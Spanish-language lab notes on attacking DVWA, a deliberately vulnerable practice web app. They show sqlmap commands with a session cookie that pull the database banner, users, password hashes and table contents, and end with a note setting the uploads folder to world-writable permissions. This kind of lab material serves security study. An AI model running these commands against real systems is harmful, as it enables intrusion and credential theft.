
## Inyección, SQLMAP
URL
http://192.168.198.222/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#
Cookie
security=low; PHPSESSID=b42o8d17t7vbj8qd3gmgjjnha0 

Web analisis >SQLMAP
ingresar la url sin parametros 
patametros para hacerlo desde CLI
-u URL
--current-db
--currente-user
--cookie
-b obtener el baner 

sqlmap -u "http://192.168.198.222/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=b42o8d17t7vbj8qd3gmgjjnha0" -b --current-db --current-user


sqlmap -u "http://192.168.198.222/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=b42o8d17t7vbj8qd3gmgjjnha0" --string="Surname" --users --password


sqlmap -u "http://192.168.198.222/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=b42o8d17t7vbj8qd3gmgjjnha0" --string="Surname" --dump 

sqlmap -u "http://192.168.198.222/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=b42o8d17t7vbj8qd3gmgjjnha0" -D dwa -T users --columns

## File Upload
cambiar los permisos de archivo
ruta /var/www/html/DVWA/hackeable
sudo chmod -R  777 uploads ->darle perminos de rw a todos 